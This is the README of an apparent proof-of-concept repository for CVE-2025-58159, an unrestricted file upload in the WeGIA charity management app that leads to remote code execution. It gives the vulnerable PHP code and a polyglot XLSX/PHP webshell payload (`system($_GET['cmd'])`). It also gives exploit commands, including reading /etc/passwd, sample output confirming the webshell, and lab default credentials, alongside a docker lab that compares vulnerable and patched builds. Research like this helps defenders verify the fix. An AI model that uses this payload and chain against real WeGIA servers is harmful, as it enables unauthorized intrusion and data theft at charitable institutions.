# CVE-2025-58159 - WeGIA Unrestricted File Upload to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel) | dev@exploit-intel.com

## Vulnerability Summary

| Field       | Value                                                |
|-------------|------------------------------------------------------|
| CVE         | CVE-2025-58159                                       |
| Component   | [WeGIA](https://github.com/LabRedesCefetRJ/WeGIA) — Web Manager for Charitable Institutions |
| Type        | CWE-434: Unrestricted Upload of File with Dangerous Type, CWE-94: Code Injection |
| CVSS        | 9.9 (Critical) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| EPSS        | 0.5% (63.4th percentile)                            |
| Affected    | All versions before 3.4.11                           |
| Fix         | v3.4.11 — commit [`ae5a1cb`](https://github.com/LabRedesCefetRJ/WeGIA/commit/ae5a1cbf494c865d68037f71822ac3366590d165) |
| Author      | Exploit Intelligence Platform (dev@exploit-intel.com)|
| Date        | 2026-02-26                                           |
| Blog Post   | [Three CVEs, One Bypass — CVEForge Gets Real](https://exploit-intel.com/blog/posts/three-cves-one-bypass-cveforge-gets-real/) |

## Vulnerability Details

The file upload handler at `html/socio/sistema/controller/controla_xlsx.php` (81 lines of PHP) performs MIME type validation using `finfo_file()`, which inspects the file's magic bytes. Only Excel MIME types are accepted. However, the code extracts the file extension directly from the user-supplied filename via `pathinfo()` and uses it verbatim — **no extension whitelist is enforced**.

```php
// MIME validation via finfo — checks file MAGIC BYTES
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$file_mime = finfo_file($finfo, $file_tmp);
finfo_close($finfo);

if (!in_array($file_mime, $allowed_types)) {
    die(json_encode(['resultado' => false, 'mensagem' => 'Tipo não permitido']));
}

// Extension from user-supplied filename — NO WHITELIST CHECK
$ext = pathinfo($file_name_original, PATHINFO_EXTENSION);
$new_name = uniqid() . '_' . $sanitized_name . '.' . $ext;
move_uploaded_file($file_tmp, '../tabelas/' . $new_name);
```

Two security checks. One rigorous, one absent. The MIME validation asks: *what is this file?* The extension handling asks: *what should we call this file?* Apache only cares about the second question.

### Attack Chain

The exploit uses a polyglot — a file that's simultaneously valid XLSX and executable PHP. XLSX files are ZIP archives (magic bytes: `PK\x03\x04`). PHP ignores everything before `<?php`. So you build a minimal XLSX (1,592 bytes of proper OOXML structure), append `<?php system($_GET["cmd"]); ?>`, upload it as `shell.php`, and the server validates the content (passes — it's a real XLSX), ignores the extension (no check), and drops a webshell into a web-accessible directory.

```
POST controla_xlsx.php  (polyglot: XLSX bytes + PHP webshell, filename=shell.php)
  → finfo_file() → "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" ✅
  → pathinfo("shell.php") → ext = "php" (NO CHECK)
  → move_uploaded_file → tabelas/<uniqid>_shell.php

GET tabelas/<uniqid>_shell.php?cmd=id
  → Apache serves as PHP → <?php system("id") ?> → RCE
```

### Fix (Commit ae5a1cb)

The fix removes the entire vulnerable endpoint. `controla_xlsx.php` — all 81 lines — deleted. The JavaScript that called it, deleted. No code, no bug.

The sibling endpoint `controla_xlsx_cobranca.php` was not affected — it already enforced an extension whitelist (`$permitidos = array('xlsx')`).

## Lab Setup

### Architecture

```
┌────────────────────────────────┐
│  cve-2025-58159-db             │
│  MariaDB 10.11                 │
│  root/rootpass                 │
└──────────┬─────────────────────┘
           │
    ───────┼──────────────────────── lab-net
           │
┌──────────┴─────────────────────┐  ┌────────────────────────────────┐
│  cve-2025-58159-vulnerable     │  │  cve-2025-58159-patched        │
│  WeGIA 3.4.10                  │  │  WeGIA 3.4.11                  │
│  controla_xlsx.php — VULN      │  │  controla_xlsx.php — REMOVED   │
│  Debian + Apache + PHP 8.2     │  │  Debian + Apache + PHP 8.2     │
└────────────────────────────────┘  └────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2025-58159

# Build and start
docker compose build
docker compose up -d

# Get the vulnerable container IP
VULN_IP=$(docker inspect cve-2025-58159-vulnerable \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
  | awk -F, '{print $NF}')

# Run the PoC against the vulnerable container
python3 poc/poc.py ${VULN_IP} 80 id

# Verify the patched container blocks it
PATCHED_IP=$(docker inspect cve-2025-58159-patched \
  --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' \
  | awk -F, '{print $NF}')
python3 poc/poc.py ${PATCHED_IP} 80 id

# Cleanup
docker compose down -v
```

### Container Details

| Container | Role | WeGIA Version | Description |
|---|---|---|---|
| `cve-2025-58159-db` | MariaDB 10.11 | — | Shared database |
| `cve-2025-58159-db-init` | Schema initializer | — | One-shot DB seed |
| `cve-2025-58159-vulnerable` | Vulnerable target | **3.4.10** | `controla_xlsx.php` present |
| `cve-2025-58159-patched` | Patched comparison | **3.4.11** | Endpoint removed |

### Default Credentials

| Service | Username | Password |
|---------|----------|----------|
| WeGIA admin login | `admin` (CPF field) | `wegia` |
| MariaDB root | `root` | `rootpass` |
| MariaDB app user | `wegiauser` | `senha` |

## PoC Usage

The PoC script (`poc/poc.py`) is a standalone Python 3 tool with **no external dependencies** (stdlib only). It generates a minimal XLSX/PHP polyglot in memory, uploads it, and executes commands via the resulting webshell.

```bash
# Basic syntax
python3 poc/poc.py <target_host> <port> [command]

# Execute commands
python3 poc/poc.py ${VULN_IP} 80 id
python3 poc/poc.py ${VULN_IP} 80 whoami
python3 poc/poc.py ${VULN_IP} 80 "uname -a"
python3 poc/poc.py ${VULN_IP} 80 "cat /etc/passwd"
```

**Example output (vulnerable target):**

```
======================================================================
  CVE-2025-58159: WeGIA Unrestricted File Upload → RCE
  Target: http://172.20.0.4:80
======================================================================

[*] Authenticating to http://172.20.0.4:80 as 'admin'...
[+] Authentication successful! PHPSESSID=4k1tbudo3a8ptvg5...

[*] Generating minimal XLSX file...
    XLSX size: 1592 bytes
    Payload size: 1670 bytes (XLSX + PHP)
[*] Uploading polyglot file with .php extension...
[+] Upload successful!
    Shell URL: http://172.20.0.4:80/html/socio/sistema/tabelas/69a0fed1474c7_shell.php

[*] Executing command: id
[+] Command output:
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Running verification commands...
    whoami:   www-data
    hostname: e12a9584d88e
    uname -a: Linux e12a9584d88e 6.12.68-linuxkit #1 SMP ...

======================================================================
  [+] REMOTE CODE EXECUTION CONFIRMED!
  [+] Webshell: http://172.20.0.4:80/html/socio/sistema/tabelas/69a0fed1474c7_shell.php
  [+] Running as: www-data
======================================================================
```

## Verification: Vulnerable vs Patched

| Step | Vulnerable (3.4.10) | Patched (3.4.11) |
|---|---|---|
| Authentication | Success — PHPSESSID obtained | Success — PHPSESSID obtained |
| Upload to `controla_xlsx.php` | `HTTP 200` — file accepted | `HTTP 404` — endpoint removed |
| Webshell access | `uid=33(www-data)` — RCE confirmed | N/A — no file uploaded |
| **Result** | **VULNERABLE** | **PATCHED** |

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Standalone RCE exploit — zero dependencies, Python 3 stdlib only |
| `Dockerfile.vulnerable` | WeGIA 3.4.10 container (vulnerable) |
| `Dockerfile.patched` | WeGIA 3.4.11 container (patched) |
| `docker-compose.yml` | Lab with MariaDB + vulnerable + patched containers |
| `db-init.sh` | Database schema initialization script |
| `entrypoint.sh` | Container entrypoint (Apache) |

## References

- [Security Advisory (GHSA-wj2c-237g-cgqp)](https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-wj2c-237g-cgqp)
- [Fix Commit ae5a1cb](https://github.com/LabRedesCefetRJ/WeGIA/commit/ae5a1cbf494c865d68037f71822ac3366590d165)
- [WeGIA Repository](https://github.com/LabRedesCefetRJ/WeGIA)
- [Vulnerable Release (3.4.10)](https://github.com/LabRedesCefetRJ/WeGIA/releases/tag/3.4.10)
- [Patched Release (3.4.11)](https://github.com/LabRedesCefetRJ/WeGIA/releases/tag/3.4.11)
- [Blog Post: Three CVEs, One Bypass — CVEForge Gets Real](https://exploit-intel.com/blog/posts/three-cves-one-bypass-cveforge-gets-real/)

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2025-58159 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. Always follow responsible disclosure practices and coordinate with affected vendors before publishing vulnerability details.
